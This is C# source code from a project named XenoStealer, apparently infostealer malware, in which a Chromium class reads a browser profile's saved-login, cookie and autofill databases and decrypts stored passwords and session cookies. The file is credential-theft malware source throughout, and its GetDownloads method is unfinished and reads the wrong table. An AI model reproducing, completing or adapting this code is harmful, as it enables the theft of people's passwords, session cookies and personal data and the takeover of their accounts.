using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class Chromium
    {

        public static DataExtractionStructs.ChromiumLogin[] GetLogins(string profilePath, ChromeDecryptor decryptor) 
        {
            List<DataExtractionStructs.ChromiumLogin> logins = new List<DataExtractionStructs.ChromiumLogin>();
        
            string db_location = Path.Combine(profilePath, "Login Data");
            if (!File.Exists(db_location))
            {
                return null;
            }
        
            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }
        
            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }
        
            if (!parser.ReadTable("logins"))
            {
                return null;
            }
        
            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                object password_obj = parser.GetValue(i, "password_value");
                object username_obj = parser.GetValue(i, "username_value");
                object url_obj = parser.GetValue(i, "action_url");

                if (password_obj.GetType() != typeof(byte[]) || username_obj.GetType() != typeof(string) || url_obj.GetType() != typeof(string)) 
                {
                    continue;
                }

                byte[] password_buffer = (byte[])password_obj;
                string username = (string)username_obj;
                string url = (string)url_obj;


                if (string.IsNullOrEmpty(url))
                {
                    object TempUrl_obj = parser.GetValue(i, "origin_url");
                    if (TempUrl_obj.GetType()!=typeof(string) && TempUrl_obj != null) 
                    {
                        url = (string)TempUrl_obj;
                    }
                }
                if (password_buffer == null || username == null || url == null) continue;
        
                string password = decryptor.Decrypt(password_buffer);
        
                if (string.IsNullOrEmpty(password))
                {
                    continue;
                }
                logins.Add(new DataExtractionStructs.ChromiumLogin(username, password, url));
            }
        
            return logins.ToArray();
        
        }
        public static DataExtractionStructs.ChromiumCookie[] GetCookies(string profilePath, ChromeDecryptor decryptor) 
        {
            List<DataExtractionStructs.ChromiumCookie> cookies = new List<DataExtractionStructs.ChromiumCookie>();
        
            string db_location = Path.Combine(profilePath, "Network", "Cookies");
            if (!File.Exists(db_location))
            {
                return null;
            }
        
            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }
        
            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }
        
            if (!parser.ReadTable("cookies"))
            {
                return null;
            }
        
            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                object domain_obj = parser.GetValue(i, "host_key");
                object name_obj = parser.GetValue(i, "name");
                object path_obj = parser.GetValue(i, "path");
                object encryptedCookieBuffer_obj = parser.GetValue(i, "encrypted_value");
                object expiry_obj = parser.GetValue(i, "expires_utc");
                object secure_obj = parser.GetValue(i, "is_secure");
                object httpOnly_obj = parser.GetValue(i, "is_httponly");

                if (domain_obj.GetType() != typeof(string) || name_obj.GetType() != typeof(string) || path_obj.GetType() != typeof(string) || encryptedCookieBuffer_obj.GetType() != typeof(byte[]) || expiry_obj.GetType() != typeof(long) || secure_obj.GetType() != typeof(int) || httpOnly_obj.GetType() != typeof(int)) 
                {
                    continue;
                }

                string domain = (string)domain_obj;
                string name = (string)name_obj;
                string path = (string)path_obj;
                byte[] encryptedCookieBuffer = (byte[])encryptedCookieBuffer_obj;
                long expiry = (long)expiry_obj;
                bool secure = (int)secure_obj == 1;
                bool httpOnly = (int)httpOnly_obj == 1;
                
        
                if (domain == null || name == null || path == null || encryptedCookieBuffer == null || expiry == 0) continue;
        
                string decryptedCookie = decryptor.Decrypt(encryptedCookieBuffer);
                if (string.IsNullOrEmpty(decryptedCookie))
                {
                    continue;
                }
                cookies.Add(new DataExtractionStructs.ChromiumCookie(domain, path, name, decryptedCookie, expiry, secure, httpOnly));
            }
        
            return cookies.ToArray();
        }
        public static DataExtractionStructs.ChromiumAutoFill[] GetAutoFills(string profilePath) 
        {
            List<DataExtractionStructs.ChromiumAutoFill> autofills = new List<DataExtractionStructs.ChromiumAutoFill>();
        
            string db_location = Path.Combine(profilePath, "Web Data");
            if (!File.Exists(db_location))
            {
                return null;
            }
        
            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }
        
            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }
        
            if (!parser.ReadTable("autofill"))
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                object name_obj = parser.GetValue(i, "name");
                object value_obj = parser.GetValue(i, "value");

                if (name_obj.GetType() != typeof(string) || value_obj.GetType() != typeof(string))
                {
                    continue;
                }


                string name = (string)name_obj;
                string value = (string)value_obj;

                if (name == null || value == null)
                {
                    continue;
                }
                autofills.Add(new DataExtractionStructs.ChromiumAutoFill(name, value));
            }
        
            return autofills.ToArray();
        }

        public static DataExtractionStructs.ChromiumDownload[] GetDownloads(string profilePath) 
        {
            List<DataExtractionStructs.ChromiumDownload> downloads = new List<DataExtractionStructs.ChromiumDownload>();

            string db_location = Path.Combine(profilePath, "Web Data");
            if (!File.Exists(db_location))
            {
                return null;
            }

            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }

            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }

            if (!parser.ReadTable("autofill"))
            {
                return null;
            }


            //not done.


            return downloads.ToArray();


        }

    }
}
